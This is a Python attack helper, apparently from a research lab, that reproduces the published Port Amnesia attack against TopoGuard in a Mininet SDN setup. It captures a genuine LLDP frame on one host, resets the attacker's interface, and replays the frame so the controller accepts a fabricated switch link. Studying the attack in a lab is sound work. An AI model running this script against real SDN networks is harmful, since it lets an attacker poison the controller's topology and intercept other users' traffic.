#!/usr/bin/env python3
"""Port Amnesia attack helper for the TopoGuard-Ryu lab.

Port Amnesia (Skowyra et al., DSN 2018) bypasses TopoGuard's link fabrication
defense by RELAYING a genuine controller-emitted LLDP frame across two
colluding hosts on different switches. TopoGuard's HMAC TLV binds the LLDP
only to the claimed (dpid, port) pair and not to the receiving port, so a
relayed LLDP still verifies and the receiving port is silently reclassified
as SWITCH. The Port-Down/Port-Up step ("amnesia") forces TopoGuard to clear
any cached HOST profile on the attacker port so the LLDP is not pre-rejected.

Subcommands:
  capture  sniff one LLDP frame on the cooperating host's interface
  inject   replay a previously captured LLDP onto the attacker's interface

Typical mininet flow (run from the topoguard-ryu directory):
  h3 python3 attacks/port_amnesia.py capture --iface h3-eth0 \
        --out /tmp/pa_lldp.bin --timeout 10
  h1 python3 attacks/port_amnesia.py inject  --iface h1-eth0 \
        --in  /tmp/pa_lldp.bin
"""

from __future__ import annotations

import argparse
import os
import socket
import struct
import subprocess
import sys
import time

ETH_P_ALL = 0x0003
ETH_TYPE_LLDP = 0x88CC


def cmd_capture(args: argparse.Namespace) -> int:
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    try:
        sock.bind((args.iface, 0))
        sock.settimeout(args.timeout)
        deadline = time.time() + args.timeout
        while time.time() < deadline:
            try:
                frame, _ = sock.recvfrom(65535)
            except socket.timeout:
                break
            if len(frame) < 14:
                continue
            if struct.unpack("!H", frame[12:14])[0] != ETH_TYPE_LLDP:
                continue
            with open(args.out, "wb") as f:
                f.write(frame)
            print(
                f"captured {len(frame)} bytes of LLDP on {args.iface} -> {args.out}"
            )
            return 0
    finally:
        sock.close()
    print(f"capture timed out: no LLDP seen on {args.iface}", file=sys.stderr)
    return 1


def cmd_inject(args: argparse.Namespace) -> int:
    if not os.path.exists(args.in_path):
        print(f"missing capture file {args.in_path}", file=sys.stderr)
        return 1
    with open(args.in_path, "rb") as f:
        frame = f.read()
    if len(frame) < 14:
        print("captured frame too short to be valid Ethernet", file=sys.stderr)
        return 1

    if not args.no_amnesia:
        # Port amnesia: down/up the attacker's interface so the controller
        # observes Port-Down then Port-Up on this port. TopoGuard treats this
        # as a behavioral profile reset, allowing the relayed LLDP to be
        # accepted as a switch-to-switch link advertisement.
        subprocess.run(["ip", "link", "set", "dev", args.iface, "down"], check=False)
        time.sleep(args.amnesia_delay)
        subprocess.run(["ip", "link", "set", "dev", args.iface, "up"], check=False)
        time.sleep(args.amnesia_delay)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    try:
        sock.bind((args.iface, 0))
        sock.send(frame)
    finally:
        sock.close()

    print(f"injected {len(frame)} byte LLDP on {args.iface}")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Port Amnesia attack helper")
    sub = parser.add_subparsers(dest="cmd", required=True)

    cap = sub.add_parser("capture", help="Sniff one LLDP frame")
    cap.add_argument("--iface", required=True)
    cap.add_argument("--out", required=True)
    cap.add_argument("--timeout", type=float, default=15.0)
    cap.set_defaults(func=cmd_capture)

    inj = sub.add_parser("inject", help="Replay captured LLDP")
    inj.add_argument("--iface", required=True)
    inj.add_argument("--in", dest="in_path", required=True)
    inj.add_argument(
        "--no-amnesia",
        action="store_true",
        help="skip the Port-Down/Port-Up amnesia step (pure replay)",
    )
    inj.add_argument("--amnesia-delay", type=float, default=0.4)
    inj.set_defaults(func=cmd_inject)

    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
